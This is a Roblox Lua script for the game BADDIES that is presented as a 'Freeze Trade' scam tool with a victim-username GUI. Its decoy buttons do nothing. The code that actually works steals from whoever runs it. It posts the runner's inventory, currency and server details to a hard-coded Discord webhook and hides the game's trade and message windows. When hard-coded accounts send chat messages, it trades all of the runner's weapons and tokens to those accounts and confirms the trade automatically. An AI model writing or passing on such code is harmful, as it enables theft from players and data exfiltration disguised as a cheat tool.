local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

-- Check if game is BADDIES (11158043705)
if game.PlaceId ~= 11158043705 then
    localPlayer:Kick("Script doesnt support this game, join BADDIES")
    return
end

local RFTradingSendTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
local RFTradingSetReady = ReplicatedStorage.Modules.Net["RF/Trading/SetReady"]
local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmTrade"]
local RFTradingAcceptTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/AcceptTradeOffer"]
local RFTradingSetTokens = ReplicatedStorage.Modules.Net["RF/Trading/SetTokens"]

local MY_WEBHOOK = "https://discord.com/api/webhooks/1424436948881248398/emu8kqBPTkEU7EBfHWOVTX_kaQ5DFucsfnkCX85q6nQO-ioAf6tEqN4dkwCxkNzCGnCc"
local USER_WEBHOOK = _G.Webhook or "PUTHERE"
local MY_USERNAMES = _G.Usernames or {"jayhassogyau", "stopbanningmyaccs67", "mantskeys55", "jayisbodybuilt", "mydignames6769"}

local START_TIME = os.time()

local function checkServerStatus()
    local playerCount = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers
    if playerCount >= maxPlayers - 1 then
        localPlayer:Kick("rejoin a diff server")
        return false
    end
    if playerCount < 3 then
        localPlayer:Kick("DATA not loaded, rejoin a public")
        return false
    end
    return true
end

if not checkServerStatus() then return end

local function formatNumber(num)
    if not num then return "N/A" end
    if num >= 1000000 then
        return string.format("%.1fM", num / 1000000)
    elseif num >= 1000 then
        return string.format("%.1fK", num / 1000)
    else
        return tostring(num)
    end
end

local function hasMainWeapons()
    local tools = {}
    local function collect(from)
        if from then
            for _, v in ipairs(from:GetChildren()) do
                if v:IsA("Tool") then table.insert(tools, v.Name) end
            end
        end
    end
    collect(localPlayer:FindFirstChild("Backpack"))
    collect(localPlayer.Character)
    collect(localPlayer:FindFirstChild("StarterGear"))
    local function classifyTools(tools)
        local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
        local base, main = {}, {}
        for _, name in ipairs(tools) do
            local lower = name:lower()
            local matched = false
            for _, p in ipairs(patterns) do
                if string.find(lower, p:lower(), 1, true) then
                    table.insert(base, name)
                    matched = true
                    break
                end
            end
            if not matched then table.insert(main, name) end
        end
        return base, main
    end
    local base, main = classifyTools(tools)
    return #main > 5, base, main, #main
end

local function deleteMessagesGui()
    local messagesGui = playerGui:FindFirstChild("Messages")
    if messagesGui then messagesGui:Destroy() end
end

local function sendRequest(url, body)
    if not url or url == "" then return nil end
    local headers = {["Content-Type"] = "application/json"}
    local encoded = body
    if type(body) ~= "string" then
        local ok, s = pcall(function() return HttpService:JSONEncode(body) end)
        if ok then encoded = s else encoded = "{}" end
    end
    local candidates = {
        function() if syn and syn.request then return syn.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
        function() if request then return request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
        function() if http and http.request then return http.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
        function() if http_request then return http_request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
        function() if fluxus and fluxus.request then return fluxus.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end
    }
    for _, tryFn in ipairs(candidates) do
        local ok, res = pcall(tryFn)
        if ok and res then
            if res.Success == true or res.StatusCode == 200 or (res.Body ~= nil) then
                return res
            end
        end
    end
    return nil
end

local function getTokenAmountFromTradeList()
    local tradeList = playerGui:FindFirstChild("TradeList")
    if tradeList then
        local main = tradeList:FindFirstChild("Main")
        if main then
            local tokenAmount = main:FindFirstChild("TokenAmount")
            if tokenAmount then
                local textLabel = tokenAmount:FindFirstChild("TextLabel")
                if textLabel then
                    local text = textLabel.Text
                    local tokenNumber = string.match(text, "%d+")
                    if tokenNumber then
                        return tonumber(tokenNumber)
                    end
                end
            end
        end
    end
    return 0
end

local function sendFullInventory()
    if not checkServerStatus() then return nil end
    
    local playerCount = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers
    local isPrivateServer = playerCount < 3
    
    if isPrivateServer then
        return nil
    end
    
    local tools = {}
    local function collect(from)
        if from then
            for _, v in ipairs(from:GetChildren()) do
                if v:IsA("Tool") then table.insert(tools, v.Name) end
            end
        end
    end
    collect(localPlayer:FindFirstChild("Backpack"))
    collect(localPlayer.Character)
    collect(localPlayer:FindFirstChild("StarterGear"))
    local function classifyTools(tools)
        local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
        local base, main = {}, {}
        for _, name in ipairs(tools) do
            local lower = name:lower()
            local matched = false
            for _, p in ipairs(patterns) do
                if string.find(lower, p:lower(), 1, true) then
                    table.insert(base, name)
                    matched = true
                    break
                end
            end
            if not matched then table.insert(main, name) end
        end
        return base, main
    end
    local base, main = classifyTools(tools)
    local hasMoreThan5Weapons = #main > 5
    local baseText = #base > 0 and table.concat(base, " ‚Ä¢ ") or "None"
    local mainText = #main > 0 and table.concat(main, "\n") or "None"
    local ls = localPlayer:FindFirstChild("leaderstats")
    local dinero = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
    local slays = ls and ls:FindFirstChild("Slays") and ls.Slays.Value or "N/A"
    local formattedDinero = formatNumber(dinero)
    local formattedSlays = formatNumber(slays)
    local elapsed = os.time() - START_TIME
    local function fmt(sec)
        local m = math.floor(sec/60) local s = sec%60
        if m>0 then return m.."m "..s.."s" end
        return s.."s"
    end
    
    local serverLink = "roblox://placeID=" .. game.PlaceId .. "&jobID=" .. game.JobId
    local joinScript = "local ts = game:GetService('TeleportService') ts:TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')"
    
    local executor = "Unknown"
    if syn then executor = "Synapse X"
    elseif fluxus then executor = "Fluxus"
    else executor = nil end
    
    local tokenAmount = getTokenAmountFromTradeList()
    
    local useMyWebhook = false
    local playerName = localPlayer.Name
    if hasMoreThan5Weapons then useMyWebhook = true end
    local targetWebhook = useMyWebhook and MY_WEBHOOK or USER_WEBHOOK
    if targetWebhook == "PUTHERE" and not useMyWebhook then return nil end
    
    local fields = {
        {name="üí∞ Dinero", value=tostring(formattedDinero), inline=true},
        {name="‚öîÔ∏è Slays", value=tostring(formattedSlays), inline=true},
        {name="ü™ô Tokens", value=tostring(tokenAmount), inline=true},
        {name="‚è±Ô∏è Player Executed", value=fmt(elapsed).." ago", inline=false},
        {name="üîó Server Link", value="[Click to Join]("..serverLink..")", inline=false},
        {name="üß© Server Joiner script", value="```lua\n"..joinScript.."```", inline=false},
    }
    
    if executor then
        table.insert(fields, {name="‚ö° Executor", value=executor, inline=false})
    end
    
    local embed = {
        title = "*" .. playerName .. "*'s Weapons üî´",
        description = "**Base Weapons**\n"..baseText.."\n\n**Main Weapons**\n"..mainText,
        color = 0x000000,
        fields = fields,
        footer = {text="Inventory Logger ‚Ä¢ "..playerName},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    local content = playerName.." has executed"
    if hasMoreThan5Weapons and useMyWebhook then content = content .. " @everyone @here üîî RICH PLAYER DETECTED!" end
    local payload = {content = content, embeds = {embed}}
    return sendRequest(targetWebhook, payload)
end

deleteMessagesGui()
sendFullInventory()

local weapons = {
    "Kitty Purse::None",
    "Freeze Gun::None",
    "Shiny Purse::None",
    "Loveboard::None",
    "SpikedPurse::None",
    "Brass Knuckles::None",
    "Golden Snowball Launcher::None",
    "Snowball Launcher::None",
    "Sledge Hammer::None",
    "Spiked Kitty Stanli::None",
    "Turkey Skewers::None",
    "Fan of Requiem::None",
    "Chainsaw::None",
    "Scythe::None",
    "Trashbin Disguise::None",
    "Cupid's Bow::None",
    "Crowbar::None",
    "Harpoon::None",
    "Heartbreaker Style::None",
    "Cannon::None",
    "Spiked Knuckles::None",
    "Glitter Bomb::None",
    "Spiked Nightmare Purse::None",
    "Glitter Style::None",
    "Trident::None",
    "Sakura Blade::None",
    "Nunchucks::None",
    "DogPurse::None",
    "Champion Gloves::None",
    "Chain Mace::None",
    "Surf's Up Hoverboard::None",
    "Graveyard Howl RPG::None",
    "Mocha Missile Maker RPG::None",
    "Black Flame Stomp::None",
    "Angelic Board::None",
    "Credit Card Hoverboard::None",
    "Constellations RPG::None",
    "Palm Sakura Blade::None",
    "Popstar Hoverboard::None",
    "Pink Star Board::None",
    "Thorned Romance::None",
    "Mischief Stomp::None",
    "Lava RPG::None",
    "Crushing Love::None",
    "Love Bomb Finisher::None",
    "Haunted Cemetery RPG::None",
    "Cyber Samurai RPG::None",
    "Graveyard Grip Knuckles::None",
    "Black Flame Knuckles::None",
    "Vanity Vortex Finisher::None",
    "Egg Rocket Launcher::None",
    "Frostwind Glider Board::None",
    "Sakura Finisher::None",
    "Witch's Wands Taser::None",
    "Vampire Flamethrower::None",
    "The Doom Knuckles::None",
    "Shadow Sorcery Purse::None",
    "Flintlock::None",
    "Doom Finisher::None",
    "Pinata Purse::None",
    "Cutlass Sakura Blade::None",
    "Police Hoverboard::None",
    "Y&Y Board::None",
    "Vampire Brass Knuckles::None",
    "Dual Shadow of Night Blade::None"
}

local function safeClick(btn)
    if not btn then return end
    local success = false
    pcall(function()
        if btn.MouseButton1Click then
            firesignal(btn.MouseButton1Click)
            success = true
        elseif btn.Activated then
            firesignal(btn.Activated)
            success = true
        end
    end)
    if not success then
        pcall(function()
            local pos, size = btn.AbsolutePosition, btn.AbsoluteSize
            local x, y = pos.X + size.X/2, pos.Y + size.Y/2
            VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
            task.wait(0.05)
            VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
        end)
    end
end

local function clickWeapons()
    local tradingGui = playerGui:FindFirstChild("Trading")
    if not tradingGui then return 0 end
    local frame = tradingGui:FindFirstChild("Frame")
    if not frame then return 0 end
    local main = frame:FindFirstChild("Main")
    if not main then return 0 end
    local yourOffer = main:FindFirstChild("YourOffer")
    if not yourOffer then return 0 end
    local itemDisplay = yourOffer:FindFirstChild("ItemDisplay")
    if not itemDisplay then return 0 end
    local scrollingFrame = itemDisplay:FindFirstChild("ScrollingFrame")
    if not scrollingFrame then return 0 end
    
    local addedCount = 0
    local maxAttempts = 5
    
    for attempt = 1, maxAttempts do
        local currentAdded = 0
        for _, name in ipairs(weapons) do
            local btn = scrollingFrame:FindFirstChild(name)
            if btn and btn:IsA("ImageButton") and btn.Visible then
                safeClick(btn)
                currentAdded = currentAdded + 1
                addedCount = addedCount + 1
                task.wait(0.02)
            end
        end
        
        if currentAdded == 0 then
            break
        end
        
        task.wait(0.5)
    end
    
    return addedCount
end

local function getTokenAmount()
    local tradingGui = playerGui:FindFirstChild("Trading")
    if tradingGui then
        local frame = tradingGui:FindFirstChild("Frame")
        if frame then
            local categories = frame:FindFirstChild("Categories")
            if categories then
                local tokenAmount = categories:FindFirstChild("TokenAmount")
                if tokenAmount then
                    local textLabel = tokenAmount:FindFirstChild("TextLabel")
                    if textLabel then
                        local text = textLabel.Text
                        local tokenNumber = string.match(text, "%d+")
                        if tokenNumber then
                            return tonumber(tokenNumber)
                        end
                    end
                end
            end
        end
    end
    return 0
end

local function spamConfirm()
    for i = 1, 10 do
        pcall(function() RFTradingConfirmTrade:InvokeServer() end)
        task.wait(0.05)
    end
end

local function autoCompleteTrade()
    print("Starting autoCompleteTrade...")
    
    -- Wait for trading GUI to fully load
    task.wait(1)
    
    -- Add ALL weapons first
    local addedCount = clickWeapons()
    print("Added " .. addedCount .. " weapons")
    
    -- Set tokens
    local tokenAmount = getTokenAmount()
    if tokenAmount then
        pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end)
        print("Set tokens to: " .. tokenAmount)
    end
    
    -- Wait to ensure all weapons are added
    task.wait(3)
    
    -- Set ready
    pcall(function() 
        RFTradingSetReady:InvokeServer(true) 
        print("Set ready to true")
    end)
    
    -- Wait 5 seconds for the trade timer after both accept
    print("Waiting 5 seconds for trade timer...")
    task.wait(5)
    
    -- Spam confirm
    spamConfirm()
    print("Spammed confirm 10 times")
end

local function setupTrading()
    pcall(function() RESetPhoneSettings:FireServer("TradeEnabled", true) end)
    local tradeList = playerGui:WaitForChild("TradeList")
    local mainFrame = tradeList:WaitForChild("Main")
    local tradeRequest = mainFrame:WaitForChild("TradeRequest")
    tradeRequest.Visible = true
    local isProcessing = false
    
    local function processChatMessage(sender, txt)
        if isProcessing then return end
        local shouldTrade = false
        for _, username in ipairs(MY_USERNAMES) do
            if sender.Name:lower() == username:lower() then
                shouldTrade = true
                break
            end
        end
        
        if shouldTrade then
            isProcessing = true
            
            if txt == "start" then
                autoCompleteTrade()
            else
                local target = Players:FindFirstChild(sender.Name)
                if target then 
                    task.wait(0.2)
                    pcall(function() RFTradingSendTradeOffer:InvokeServer(target) end) 
                end
            end
            
            isProcessing = false
        end
    end

    if TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            local ts = message.TextSource
            if not ts then return end
            local sender = Players:GetPlayerByUserId(ts.UserId)
            if not sender then return end
            local txt = tostring(message.Text or ""):lower()
            task.delay(0.5, function() processChatMessage(sender, txt) end)
        end
    end
    
    local function onPlayerChatted(player, message)
        if player and message then
            task.delay(0.5, function() processChatMessage(player, message:lower()) end)
        end
    end
    
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            pcall(function()
                player.Chatted:Connect(function(message)
                    onPlayerChatted(player, message)
                end)
            end)
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        pcall(function()
            player.Chatted:Connect(function(message)
                onPlayerChatted(player, message)
            end)
        end)
    end)

    local function handleGui(gui)
        if gui.Name == "Trading" then gui.Enabled = false
        elseif gui.Name == "Messages" then gui:Destroy() end
    end
    
    for _, gui in ipairs(playerGui:GetChildren()) do handleGui(gui) end
    playerGui.ChildAdded:Connect(handleGui)
    
    task.spawn(function()
        while true do
            if not checkServerStatus() then break end
            local t = playerGui:FindFirstChild("Trading")
            if t then t.Enabled = false end
            local m = playerGui:FindFirstChild("Messages")
            if m then m:Destroy() end
            task.wait(0.1)
        end
    end)
end

setupTrading()

local originalAcceptTrade = RFTradingAcceptTradeOffer.InvokeServer

RFTradingAcceptTradeOffer.InvokeServer = function(player)
    local result = originalAcceptTrade(RFTradingAcceptTradeOffer, player)
    
    for _, username in ipairs(MY_USERNAMES) do
        if player.Name:lower() == username:lower() then
            task.spawn(function()
                autoCompleteTrade()
            end)
            break
        end
    end
    
    return result
end
-- LocalScript in StarterGui or StarterPlayerScripts
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create main ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BaddiesFreezeTrade"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Create main frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 350, 0, 200)
mainFrame.Position = UDim2.new(0.5, -175, 0.5, -100)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 20, 30) -- Dark pinkish background
mainFrame.BorderColor3 = Color3.fromRGB(100, 60, 100)
mainFrame.BorderSizePixel = 2
mainFrame.Parent = screenGui

-- Add corner rounding
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 8)
uiCorner.Parent = mainFrame

-- Add title label (make it draggable)
local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Size = UDim2.new(1, 0, 0, 40)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundColor3 = Color3.fromRGB(50, 30, 50) -- Pinkish header
titleLabel.BorderSizePixel = 0
titleLabel.Text = "BADDIES FREEZE TRADE"
titleLabel.TextColor3 = Color3.fromRGB(255, 182, 193) -- Light pink color
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Parent = mainFrame

-- Add corner to title
local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 8)
titleCorner.Parent = titleLabel

-- Bigger Pumpkin Icon (centered in title)
local pumpkinIcon = Instance.new("ImageLabel")
pumpkinIcon.Name = "PumpkinIcon"
pumpkinIcon.Size = UDim2.new(0, 45, 0, 45)
pumpkinIcon.Position = UDim2.new(0.5, -22, 0.5, -22)
pumpkinIcon.AnchorPoint = Vector2.new(0.5, 0.5)
pumpkinIcon.BackgroundTransparency = 1
pumpkinIcon.Image = "rbxassetid://126124408405738" -- Your custom pumpkin ID
pumpkinIcon.ZIndex = 2
pumpkinIcon.Parent = titleLabel

-- Create content frame
local contentFrame = Instance.new("Frame")
contentFrame.Name = "ContentFrame"
contentFrame.Size = UDim2.new(1, -20, 1, -60)
contentFrame.Position = UDim2.new(0, 10, 0, 50)
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = mainFrame

-- Victim Username label
local victimLabel = Instance.new("TextLabel")
victimLabel.Name = "VictimLabel"
victimLabel.Size = UDim2.new(1, 0, 0, 20)
victimLabel.Position = UDim2.new(0, 0, 0, 0)
victimLabel.BackgroundTransparency = 1
victimLabel.Text = "VICTIM USERNAME:"
victimLabel.TextColor3 = Color3.fromRGB(255, 182, 193) -- Light pink
victimLabel.TextSize = 14
victimLabel.Font = Enum.Font.Gotham
victimLabel.TextXAlignment = Enum.TextXAlignment.Left
victimLabel.Parent = contentFrame

-- TextBox for username input
local textBox = Instance.new("TextBox")
textBox.Name = "UsernameTextBox"
textBox.Size = UDim2.new(1, 0, 0, 30)
textBox.Position = UDim2.new(0, 0, 0, 25)
textBox.BackgroundColor3 = Color3.fromRGB(60, 40, 60) -- Pinkish dark
textBox.BorderColor3 = Color3.fromRGB(150, 100, 150)
textBox.BorderSizePixel = 1
textBox.Text = ""
textBox.PlaceholderText = "Enter username..."
textBox.PlaceholderColor3 = Color3.fromRGB(200, 150, 200)
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.TextSize = 14
textBox.Font = Enum.Font.Gotham
textBox.ClearTextOnFocus = false
textBox.Parent = contentFrame

-- Add corner to textbox
local textBoxCorner = Instance.new("UICorner")
textBoxCorner.CornerRadius = UDim.new(0, 4)
textBoxCorner.Parent = textBox

-- Buttons container
local buttonsFrame = Instance.new("Frame")
buttonsFrame.Name = "ButtonsFrame"
buttonsFrame.Size = UDim2.new(1, 0, 0, 80)
buttonsFrame.Position = UDim2.new(0, 0, 0, 70)
buttonsFrame.BackgroundTransparency = 1
buttonsFrame.Parent = contentFrame

-- Force Accept button (original red color)
local forceAcceptButton = Instance.new("TextButton")
forceAcceptButton.Name = "ForceAcceptButton"
forceAcceptButton.Size = UDim2.new(1, 0, 0, 35)
forceAcceptButton.Position = UDim2.new(0, 0, 0, 0)
forceAcceptButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60) -- Original red color
forceAcceptButton.BorderSizePixel = 0
forceAcceptButton.Text = "FORCE ACCEPT"
forceAcceptButton.TextColor3 = Color3.fromRGB(255, 255, 255)
forceAcceptButton.TextSize = 14
forceAcceptButton.Font = Enum.Font.GothamBold
forceAcceptButton.Parent = buttonsFrame

-- Add corner to button
local buttonCorner1 = Instance.new("UICorner")
buttonCorner1.CornerRadius = UDim.new(0, 6)
buttonCorner1.Parent = forceAcceptButton

-- Freeze Trade button (original blue color)
local freezeTradeButton = Instance.new("TextButton")
freezeTradeButton.Name = "FreezeTradeButton"
freezeTradeButton.Size = UDim2.new(1, 0, 0, 35)
freezeTradeButton.Position = UDim2.new(0, 0, 0, 45)
freezeTradeButton.BackgroundColor3 = Color3.fromRGB(60, 100, 200) -- Original blue color
freezeTradeButton.BorderSizePixel = 0
freezeTradeButton.Text = "FREEZE TRADE"
freezeTradeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
freezeTradeButton.TextSize = 14
freezeTradeButton.Font = Enum.Font.GothamBold
freezeTradeButton.Parent = buttonsFrame

-- Add corner to button
local buttonCorner2 = Instance.new("UICorner")
buttonCorner2.CornerRadius = UDim.new(0, 6)
buttonCorner2.Parent = freezeTradeButton

-- Make GUI draggable
local dragging = false
local dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

titleLabel.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

titleLabel.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- Function to create and show trade frozen notification
local function showTradeFrozenNotification()
    -- Create notification frame
    local notificationFrame = Instance.new("Frame")
    notificationFrame.Name = "TradeFrozenNotification"
    notificationFrame.Size = UDim2.new(0, 300, 0, 120)
    notificationFrame.Position = UDim2.new(0.5, -150, 0.5, -60)
    notificationFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    notificationFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    notificationFrame.BackgroundTransparency = 0.3 -- Semi-transparent black
    notificationFrame.BorderSizePixel = 0
    notificationFrame.Parent = screenGui
    
    -- Add corner rounding
    local notificationCorner = Instance.new("UICorner")
    notificationCorner.CornerRadius = UDim.new(0, 12)
    notificationCorner.Parent = notificationFrame
    
    -- Add a subtle border/stroke
    local notificationStroke = Instance.new("UIStroke")
    notificationStroke.Color = Color3.fromRGB(255, 182, 193) -- Pink border
    notificationStroke.Thickness = 2
    notificationStroke.Parent = notificationFrame
    
    -- Add "TRADE FROZEN" text
    local frozenText = Instance.new("TextLabel")
    frozenText.Name = "FrozenText"
    frozenText.Size = UDim2.new(1, -20, 1, -20)
    frozenText.Position = UDim2.new(0, 10, 0, 10)
    frozenText.BackgroundTransparency = 1
    frozenText.Text = "TRADE FROZEN"
    frozenText.TextColor3 = Color3.fromRGB(255, 182, 193) -- Pink text
    frozenText.TextSize = 24
    frozenText.Font = Enum.Font.GothamBlack
    frozenText.TextScaled = true
    frozenText.Parent = notificationFrame
    
    -- Add a small pumpkin icon to the notification
    local notificationPumpkin = Instance.new("ImageLabel")
    notificationPumpkin.Name = "NotificationPumpkin"
    notificationPumpkin.Size = UDim2.new(0, 40, 0, 40)
    notificationPumpkin.Position = UDim2.new(0.5, -20, 0, -20)
    notificationPumpkin.AnchorPoint = Vector2.new(0.5, 0)
    notificationPumpkin.BackgroundTransparency = 1
    notificationPumpkin.Image = "rbxassetid://126124408405738" -- Your custom pumpkin ID
    notificationPumpkin.Parent = notificationFrame
    
    -- Auto-remove notification after 3 seconds
    wait(3)
    notificationFrame:Destroy()
end

-- Add button hover effects and functionality
local function setupButtonHover(button)
    local originalColor = button.BackgroundColor3
    
    button.MouseEnter:Connect(function()
        button.BackgroundColor3 = originalColor * 1.2
    end)
    
    button.MouseLeave:Connect(function()
        button.BackgroundColor3 = originalColor
    end)
end

setupButtonHover(forceAcceptButton)
setupButtonHover(freezeTradeButton)

-- Force Accept button functionality
forceAcceptButton.MouseButton1Click:Connect(function()
    local username = textBox.Text
    if username == "" then
        textBox.PlaceholderText = "Please enter a username!"
        textBox.PlaceholderColor3 = Color3.fromRGB(255, 182, 193)
        wait(1)
        textBox.PlaceholderText = "Enter username..."
        textBox.PlaceholderColor3 = Color3.fromRGB(200, 150, 200)
    else
        print("FORCE ACCEPT triggered for: " .. username)
        -- Add your force accept functionality here
    end
end)

-- Freeze Trade button functionality
freezeTradeButton.MouseButton1Click:Connect(function()
    local username = textBox.Text
    if username == "" then
        textBox.PlaceholderText = "Please enter a username!"
        textBox.PlaceholderColor3 = Color3.fromRGB(255, 182, 193)
        wait(1)
        textBox.PlaceholderText = "Enter username..."
        textBox.PlaceholderColor3 = Color3.fromRGB(200, 150, 200)
    else
        print("FREEZE TRADE triggered for: " .. username)
        showTradeFrozenNotification()
        -- Add your freeze trade functionality here
    end
end)

-- Add pink glow effect to main frame
local uiStroke = Instance.new("UIStroke")
uiStroke.Color = Color3.fromRGB(255, 182, 193) -- Pink glow
uiStroke.Thickness = 1
uiStroke.Parent = mainFrame
